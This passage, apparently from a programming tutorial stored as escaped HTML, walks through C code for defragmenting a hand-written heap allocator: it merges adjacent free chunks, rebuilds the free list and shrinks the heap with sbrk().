                &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Save the last free chunk&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second part of the defragmentation algorithm will reduce the size of the heap if the last free chunk is at the end of the heap.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Check if the last free chunk is at the end of the heap&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// If so, reduce the size of the heap with sbrk() and check for errors&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// If the head of the linked list was the last freed chunk,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// then we should set it to the previous chunk.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set head to the previous value&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Delete the next value in the linked list&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Reduce the size of the heap&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is what the entire algorithm looks like:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Defragmentation does the following:&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 1.) Combines free blocks sitting next to each other.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 2.) Reduces the size of the heap if there are free block(s) at the end.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 3.) Reconstructs the entire linked list of free blocks.&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;heap_defrag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Delete the linked list&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Loop through every chunk&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Check if this is a free chunk&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If there is no linked list, then make this the head&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Save the last free chunk&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Else, add the chunk to the linked list&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// Check if the current chunk is adjacent to the last free&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// chunk that we stored.&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
                        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// Instead of adding this chunk to the linked list, just&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// increase the size of the last free chunk.&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// If chunks aren't adjacent, then just add the current&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// chunk to the linked list.&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Save the last free chunk&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Check if the last free chunk is at the end of the heap&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// If so, reduce the size of the heap with sbrk() and check for errors&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// If the head of the linked list was the last freed chunk,&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// then we should set it to the previous chunk.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set head to the previous value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Delete the next value in the linked list&lt;/span&gt;
